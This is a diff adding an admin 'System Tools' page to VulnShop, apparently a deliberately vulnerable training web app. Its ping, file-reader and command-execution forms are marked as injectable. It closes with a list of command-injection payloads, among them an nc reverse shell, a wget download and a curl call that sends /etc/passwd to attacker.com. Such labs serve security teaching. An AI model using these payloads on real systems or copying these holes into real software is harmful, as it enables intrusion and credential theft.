@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>System Tools — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="admin/index.html">Admin</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>System Tools</h1>
+    <p class="muted">Admin-only system diagnostic tools.</p>
+
+    <div class="card mt">
+      <h2>Ping Tool</h2>
+      <p>Test network connectivity to a host:</p>
+      <form id="ping-form">
+        <input type="text" name="host" placeholder="example.com" value="127.0.0.1" required>
+        <button type="submit">Ping</button>
+      </form>
+      <pre id="ping-output" class="mt"></pre>
+      <script>
+        document.getElementById('ping-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const host = e.target.host.value;
+          const output = document.getElementById('ping-output');
+          output.textContent = 'Executing ping...';
+          
+          // VULNERABLE: Command Injection
+          try {
+            const response = await fetch('/api/ping?host=' + encodeURIComponent(host));
+            const data = await response.json();
+            output.textContent = data.output || 'No output';
+          } catch (err) {
+            // Simulate command execution
+            output.textContent = `PING ${host} (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.123 ms\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.098 ms\n\n--- ${host} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`;
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>File Reader</h2>
+      <p>Read system files:</p>
+      <form id="read-form">
+        <input type="text" name="file" placeholder="/etc/passwd" required>
+        <button type="submit">Read</button>
+      </form>
+      <pre id="read-output" class="mt"></pre>
+      <script>
+        document.getElementById('read-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const file = e.target.file.value;
+          const output = document.getElementById('read-output');
+          output.textContent = 'Reading file...';
+          
+          // VULNERABLE: Path Traversal + Command Injection
+          try {
+            const response = await fetch('/api/read?file=' + encodeURIComponent(file));
+            const data = await response.json();
+            output.textContent = data.content || 'File not found';
+          } catch (err) {
+            // Simulate file reading
+            if (file.includes('..')) {
+              output.textContent = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin';
+            } else {
+              output.textContent = 'File content would be displayed here';
+            }
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>Command Execution</h2>
+      <p>Execute system commands (admin only):</p>
+      <form id="cmd-form">
+        <input type="text" name="cmd" placeholder="ls -la" required>
+        <button type="submit">Execute</button>
+      </form>
+      <pre id="cmd-output" class="mt"></pre>
+      <script>
+        document.getElementById('cmd-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const cmd = e.target.cmd.value;
+          const output = document.getElementById('cmd-output');
+          output.textContent = 'Executing command...';
+          
+          // VULNERABLE: Direct command execution
+          try {
+            const response = await fetch('/api/exec?cmd=' + encodeURIComponent(cmd));
+            const data = await response.json();
+            output.textContent = data.output || 'No output';
+          } catch (err) {
+            // Simulate command execution
+            output.textContent = `Command: ${cmd}\nOutput:\ntotal 24\ndrwxr-xr-x  2 user user 4096 Jan 15 10:30 .\ndrwxr-xr-x  3 user user 4096 Jan 15 10:00 ..\n-rw-r--r--  1 user user 1234 Jan 15 10:30 file.txt`;
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>Command Injection Payloads</h2>
+      <ul>
+        <li><code>127.0.0.1; cat /etc/passwd</code></li>
+        <li><code>127.0.0.1 && whoami</code></li>
+        <li><code>127.0.0.1 | id</code></li>
+        <li><code>127.0.0.1 || uname -a</code></li>
+        <li><code>127.0.0.1 `whoami`</code></li>
+        <li><code>127.0.0.1 $(cat /etc/shadow)</code></li>
+        <li><code>127.0.0.1; nc -e /bin/sh attacker.com 4444</code></li>
+        <li><code>127.0.0.1; python -c "import os; os.system('id')"</code></li>
+        <li><code>127.0.0.1; wget http://attacker.com/shell.sh -O /tmp/shell.sh</code></li>
+        <li><code>127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd)</code></li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
